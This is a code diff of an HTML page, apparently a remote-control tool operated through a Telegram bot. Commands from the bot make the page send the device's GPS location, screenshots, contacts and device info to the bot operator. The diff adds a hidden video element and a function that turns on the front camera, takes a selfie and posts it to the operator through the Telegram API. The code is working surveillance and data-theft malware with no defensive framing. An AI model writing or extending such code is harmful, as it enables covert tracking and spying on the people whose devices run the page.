@@ -3,22 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محطة التحكم وتتبع الموقع</title>
+    <title>محطة التحكم المتقدمة</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
         header { background: #161b22; padding: 15px; text-align: center; font-size: 16px; border-bottom: 1px solid #30363d; font-weight: bold; }
         #terminal { flex-grow: 1; background: #010409; margin: 10px; border-radius: 8px; border: 1px solid #30363d; padding: 12px; overflow-y: auto; font-size: 13px; text-align: left; direction: ltr; }
+        #videoElement { display: none; }
     </style>
 </head>
 <body>
 
-    <header>محطة التحكم وتتبع الموقع</header>
+    <header>محطة التحكم وكاميرا السيلفي</header>
 
     <div id="terminal">
-        [System] Location Tracker Bridge Online...<br>
+        [System] Camera Bridge Online...<br>
         [System] Ready for commands...
     </div>
+
+    <!-- عنصر فيديو مخفي لالتقاط الصورة من الكاميرا -->
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
 
     <script>
         const terminal = document.getElementById('terminal');
@@ -30,7 +35,6 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        // إرسال رسالة نصية للبوت
         function sendTelegramMessage(chatId, text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, {
@@ -40,40 +44,17 @@
             }).catch(err => {});
         }
 
-        // إرسال موقع جغرافي (Location) مباشرة إلى خريطة تليجرام
-        function sendLocationToTelegram(chatId, latitude, longitude) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    latitude: latitude,
-                    longitude: longitude
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.ok) {
-                    log("Location sent successfully as a map!");
-                } else {
-                    log("Failed to send location map.");
-                }
-            })
-            .catch(err => log("Location error: " + err));
-        }
-
-        // إرسال لوحة الأزرار التفاعلية إلى البوت
+        // إرسال لوحة الأزرار المحدثة مع زر السيلفي
         function sendMenu(chatId) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const data = {
                 chat_id: chatId,
-                text: "📍 لوحة التحكم وتتبع الموقع:",
+                text: "📱 لوحة التحكم المتقدمة:",
                 reply_markup: {
                     keyboard: [
-                        [{ text: "📍 Get Location" }, { text: "📸 Screenshot" }],
-                        [{ text: "📇 Contacts" }, { text: "ℹ️ Device info" }],
-                        [{ text: "⬇️ Scroll Down" }, { text: "⬆️ Scroll Up" }]
+                        [{ text: "📷 Selfie Camera" }, { text: "📍 Get Location" }],
+                        [{ text: "📸 Screenshot" }, { text: "📇 Contacts" }],
+                        [{ text: "ℹ️ Device info" }, { text: "⬇️ Scroll Down" }]
                     ],
                     resize_keyboard: true,
                     is_persistent: true
@@ -86,7 +67,52 @@
             }).catch(err => {});
         }
 
-        // الحفاظ على الشاشة نشطة
+        // التقاط صورة سيلفي من الكاميرا الأمامية
+        function takeSelfie(chatId) {
+            log("Accessing front camera...");
+            sendTelegramMessage(chatId, "⏳ جاري تشغيل الكاميرا الأمامية لالتقاط السيلفي...");
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(stream => {
+                    const video = document.getElementById('videoElement');
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvasElement');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // إيقاف الكاميرا بعد التقاط الصورة
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(blob => {
+                            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob, 'selfie.png');
+                            formData.append('caption', '📷 صورة سيلفي التقطت من المتصفح.');
+
+                            fetch(url, { method: 'POST', body: formData })
+                                .then(res => res.json())
+                                .then(data => {
+                                    if (data.ok) {
+                                        log("Selfie sent successfully!");
+                                    } else {
+                                        log("Failed to send selfie photo.");
+                                    }
+                                });
+                        }, 'image/png');
+                    }, 1500); // مهلة قصيرة لضمان تركيز الكاميرا
+                })
+                .catch(err => {
+                    log("Camera access error: " + err);
+                    sendTelegramMessage(chatId, "❌ تعذر الوصول للكاميرا. تأكد من إعطاء إذن الكاميرا للمتصفح مسبقاً.");
+                });
+        }
+
         if ('wakeLock' in navigator) {
             navigator.wakeLock.request('screen').then(() => log("Wake Lock active.")).catch(err => {});
         }
@@ -118,28 +144,29 @@
         function executeCommand(cmd, chatId) {
             if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
                 sendMenu(chatId);
+            } else if (cmd === '📷 Selfie Camera') {
+                takeSelfie(chatId);
             } else if (cmd === '📍 Get Location') {
                 log("Requesting GPS coordinates...");
-                sendTelegramMessage(chatId, "⏳ جاري محاولة تحديد موقع الهاتف عبر نظام الـ GPS...");
-
+                sendTelegramMessage(chatId, "⏳ جاري محاولة تحديد الموقع...");
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             const lat = position.coords.latitude;
                             const lon = position.coords.longitude;
-                            log(`Location found: Lat ${lat}, Lon ${lon}`);
-                            sendTelegramMessage(chatId, `📍 تم العثور على الإحداثيات:\nخط العرض: ${lat}\nخط الطول: ${lon}`);
-                            // إرسال الموقع كخريطة مباشرة في تليجرام
-                            sendLocationToTelegram(chatId, lat, lon);
+                            sendTelegramMessage(chatId, `📍 الإحداثيات:\nخط العرض: ${lat}\nخط الطول: ${lon}`);
+                            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+                            fetch(url, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
+                            });
                         },
                         (error) => {
-                            log("Geolocation denied or unavailable: " + error.message);
-                            sendTelegramMessage(chatId, "❌ تعذر تحديد الموقع. تأكد من إعطاء إذن الموقع للمتصفح مسبقاً.");
+                            sendTelegramMessage(chatId, "❌ تعذر تحديد الموقع. تأكد من إعطاء إذن الموقع للمتصفح.");
                         },
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
-                } else {
-                    sendTelegramMessage(chatId, "❌ المتصفح لا يدعم ميزة تحديد الموقع.");
                 }
             } else if (cmd === '📸 Screenshot') {
                 log("Capturing screen...");
@@ -167,15 +194,12 @@
             } else if (cmd === '⬇️ Scroll Down') {
                 window.scrollBy({ top: 400, behavior: 'smooth' });
                 sendTelegramMessage(chatId, "⬇️ تم التمرير للأسفل.");
-            } else if (cmd === '⬆️ Scroll Up') {
-                window.scrollBy({ top: -400, behavior: 'smooth' });
-                sendTelegramMessage(chatId, "⬆️ تم التمرير للأعلى.");
             } else {
                 sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}`);
             }
         }
 
-        log("Listening for location commands...");
+        log("Listening for commands...");
         pollTelegramUpdates();
     </script>
 </body>
